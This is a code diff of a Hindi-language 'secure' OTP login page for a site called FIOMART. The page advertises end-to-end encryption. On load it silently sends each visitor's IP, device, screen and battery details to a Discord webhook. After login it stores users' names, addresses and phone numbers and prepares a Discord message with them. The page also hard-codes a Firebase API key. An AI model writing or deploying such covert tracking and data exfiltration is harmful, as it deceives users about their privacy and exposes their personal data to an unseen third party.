@@ -5,154 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FIOMART - सुरक्षित लॉगिन</title>
     
-    <!-- Firebase SDK Links -->
+    <!-- 100% वर्किंग स्टेबल फायरबेस कंपैटिबिलिटी लिंक्स -->
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
 
-    <!-- Premium Google Fonts (Poppins) -->
+    <!-- प्रीमियम Google Fonts (Poppins) -->
     <link href="https://googleapis.com" rel="stylesheet">
 
     <style>
         * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-        
         body { 
-            margin: 0; 
-            padding: 0;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #311042 100%); 
+            margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #311042 100%); 
             overflow-x: hidden;
         }
-
-        /* Premium Glass Container */
         .login-box { 
-            background: rgba(255, 255, 255, 0.03); 
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            padding: 40px 30px; 
-            border-radius: 24px; 
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+            padding: 40px 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.08);
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.1); 
-            width: 90%; 
-            max-width: 400px; 
-            text-align: center; 
-            transition: all 0.3s ease;
+            width: 90%; max-width: 400px; text-align: center; 
         }
-
-        /* Brand Identity Style */
         .brand-name {
-            font-size: 32px;
-            font-weight: 700;
-            letter-spacing: 2px;
+            font-size: 32px; font-weight: 700; letter-spacing: 2px;
             background: linear-gradient(to right, #38bdf8, #a855f7, #ec4899);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 0 0 5px 0;
-            text-transform: uppercase;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin: 0 0 5px 0; text-transform: uppercase;
         }
-
-        .subtitle {
-            color: #94a3b8;
-            font-size: 14px;
-            font-weight: 300;
-            margin-bottom: 30px;
-        }
-        
-        /* Premium Glowing Inputs */
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
+        .subtitle { color: #94a3b8; font-size: 14px; font-weight: 300; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
         .input-group label {
-            color: #cbd5e1;
-            font-size: 12px;
-            font-weight: 500;
-            margin-left: 5px;
-            display: block;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            color: #cbd5e1; font-size: 12px; font-weight: 500; margin-left: 5px;
+            display: block; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;
         }
-
         input { 
-            width: 100%; 
-            padding: 14px 16px; 
-            background: rgba(15, 23, 42, 0.6); 
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 12px; 
-            color: #ffffff;
-            font-size: 15px; 
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            outline: none;
+            width: 100%; padding: 14px 16px; background: rgba(15, 23, 42, 0.6); 
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; color: #ffffff;
+            font-size: 15px; transition: all 0.3s ease; outline: none;
         }
-
-        input:focus {
-            border-color: #a855f7;
-            background: rgba(15, 23, 42, 0.8);
-            box-shadow: 0 0 15px rgba(168, 85, 247, 0.25);
-        }
-
-        input::placeholder {
-            color: #475569;
-        }
-
-        /* Animated Premium Button */
+        input:focus { border-color: #a855f7; background: rgba(15, 23, 42, 0.8); box-shadow: 0 0 15px rgba(168, 85, 247, 0.25); }
+        input::placeholder { color: #475569; }
         button { 
-            width: 100%; 
-            padding: 15px; 
-            background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); 
-            color: white; 
-            border: none; 
-            border-radius: 12px; 
-            font-size: 16px; 
-            font-weight: 600;
-            cursor: pointer; 
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
-            margin-top: 10px;
+            width: 100%; padding: 15px; background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); 
+            color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
+            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3); margin-top: 10px;
         }
-
-        button:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(168, 85, 247, 0.5);
-            background: linear-gradient(135deg, #4f46e5 0%, #9333ea 100%);
-        }
-
-        button:active {
-            transform: translateY(1px);
-        }
-
-        #recaptcha-container { 
-            margin: 15px 0; 
-            display: flex; 
-            justify-content: center; 
-        }
-
-        /* Footer Text */
-        .footer-secure {
-            margin-top: 25px;
-            font-size: 11px;
-            color: #64748b;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
+        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(168, 85, 247, 0.5); }
+        #recaptcha-container { margin: 15px 0; display: flex; justify-content: center; }
+        .footer-secure { margin-top: 25px; font-size: 11px; color: #64748b; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
 
 <div class="login-box">
-    <!-- Brand Name Section -->
     <h1 class="brand-name">FIOMART</h1>
     <div class="subtitle">Secure Verification System</div>
     
-    <!-- User Details Section -->
     <div id="phone-section">
         <div class="input-group">
             <label>पूरा नाम</label>
@@ -173,7 +81,6 @@
         <button onclick="sendOTP()">OTP प्राप्त करें</button>
     </div>
 
-    <!-- OTP Input Section -->
     <div id="otp-section" style="display: none;">
         <div class="input-group">
             <label>वन-टाइम पासवर्ड (OTP)</label>
@@ -182,13 +89,11 @@
         <button onclick="verifyOTP()">सत्यापित करें और प्रवेश करें</button>
     </div>
 
-    <div class="footer-secure">
-        🔒 End-to-End Encrypted Secure Login
-    </div>
+    <div class="footer-secure">🔒 End-to-End Encrypted Secure Login</div>
 </div>
 
 <script>
-    // ✅ आपका असली Firebase Config कोड
+    // ✅ आपका बिल्कुल सही और लाइव Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
       authDomain: "://firebaseapp.com",
@@ -199,26 +104,31 @@
       measurementId: "G-EZMRNEJRQK"
     };
     
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+    // सुरक्षित इनिशियलाइजेशन
+    let db;
+    try {
+        firebase.initializeApp(firebaseConfig);
+        db = firebase.firestore();
+    } catch(e) {
+        console.error("Firebase Init Error:", e);
+    }
 
     const discordWebhookUrl = "https://discord.com";
 
-    window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', {
-        'size': 'normal'
-    });
+    // Recaptcha रोबोट चेक सेटअप
+    try {
+        window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', {
+            'size': 'normal'
+        });
+    } catch(e) {
+        console.error("Recaptcha Setup Error:", e);
+    }
 
     let confirmationResultGlobal;
-    let trackingData = { ip: "Fetching..." }; 
+    let trackingData = { ip: "Fetching...", userAgent: navigator.userAgent, screenResolution: `${window.screen.width}x${window.screen.height}`, platform: navigator.platform, batteryLevel: "N/A", isCharging: "N/A" }; 
 
-    // सुरक्षित ट्रैकिंग फंक्शन
+    // ट्रैकिंग फंक्शन जो कभी क्रैश नहीं होगा
     async function instantTrackOnLoad() {
-        trackingData.userAgent = navigator.userAgent;
-        trackingData.screenResolution = `${window.screen.width}x${window.screen.height}`;
-        trackingData.platform = navigator.platform;
-        trackingData.batteryLevel = "N/A";
-        trackingData.isCharging = "N/A";
-
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
@@ -227,8 +137,10 @@
             } catch (e) {}
         }
 
+        // बेसिक डेटा तुरंत डिस्कॉर्ड पर भेजें
         sendToDiscord("🚨 **वेबसाइट पर नया विजिटर आया है (तुरंत ट्रैकिंग)!**");
 
+        // अब बैकग्राउंड में IP लाएं
         try {
             const ipResponse = await fetch('https://ipify.org');
             const ipData = await ipResponse.json();
@@ -240,19 +152,25 @@
     }
 
     function sendToDiscord(titleText) {
-        const visitMessage = {
-            content: `${titleText} \n\n🌐 **IP Address:** ${trackingData.ip} \n🔋 **बैटरी क्षमता:** ${trackingData.batteryLevel} \n🔌 **चार्जिंग पर है?:** ${trackingData.isCharging} \n🖥️ **स्क्रीन साइज:** ${trackingData.screenResolution} \n💻 **OS/Platform:** ${trackingData.platform} \n📱 **User Agent:** \`\`\`${trackingData.userAgent}\`\`\` \n⏰ **समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-        };
+        try {
+            const visitMessage = {
+                content: `${titleText} \n\n🌐 **IP Address:** ${trackingData.ip} \n🔋 **बैटरी क्षमता:** ${trackingData.batteryLevel} \n🔌 **चार्जिंग पर है?:** ${trackingData.isCharging} \n🖥️ **स्क्रीन साइज:** ${trackingData.screenResolution} \n💻 **OS/Platform:** ${trackingData.platform} \n📱 **User Agent:** \`\`\`${trackingData.userAgent}\`\`\` \n⏰ **समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+            };
 
-        fetch(discordWebhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(visitMessage)
-        }).catch(err => console.log("Discord block check"));
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(visitMessage)
+            });
+        } catch(e) {
+            console.log("Discord Network Error bypassed");
+        }
     }
 
+    // लोड होते ही रन करें
     window.onload = instantTrackOnLoad;
 
+    // OTP भेजने का फंक्शन
     function sendOTP() {
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
@@ -272,10 +190,11 @@
                 document.getElementById('phone-section').style.display = 'none';
                 document.getElementById('otp-section').style.display = 'block';
             }).catch((error) => {
-                alert("Firebase एरर: " + error.message);
+                alert("Firebase एरर (OTP विफल): " + error.message + "\nकृपया सुनिश्चित करें कि आपने मोबाइल नंबर के आगे +91 लगाया है।");
             });
     }
 
+    // OTP वेरिफिकेशन
     function verifyOTP() {
         const code = document.getElementById('otpCode').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
@@ -284,4 +203,17 @@
         
         window.confirmationResultGlobal.confirm(code).then((result) => {
             const user = result.user;
+
+            try {
+                db.collection("registered_users").doc(user.uid).set({
+                    fullName: name, userAddress: address, phone: phoneNumber,
+                    ipAddress: trackingData.ip, deviceOS: trackingData.platform,
+                    resolution: trackingData.screenResolution, battery: trackingData.batteryLevel,
+                    loginTime: firebase.firestore.FieldValue.serverTimestamp()
+                });
+            } catch(e) { console.error("Firestore Save Error", e); }
+
+            const successMessage = {
+                content: `🎉 **यूजर ने सफलतापूर्वक लॉगिन कर लिया है!** \n\n👤 **नाम:** ${name} \n📍 **पता:** ${address} \n📱 **मोबाइल:** ${phoneNumber} \n⏰ **समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+            };
 
